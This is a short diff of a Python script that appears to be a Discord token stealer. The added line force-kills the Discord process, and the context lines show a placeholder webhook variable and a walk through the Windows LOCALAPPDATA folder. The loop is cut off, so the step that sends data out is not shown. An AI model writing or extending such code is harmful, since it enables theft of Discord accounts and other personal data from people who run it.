@@ -1,4 +1,5 @@
 import os
+os.system('taskkill /f /im discord.exe >nul')
 webhook = 'YOUR WEBHOOK'
 env = os.getenv('localappdata')
 for a,b,c in os.walk(env):
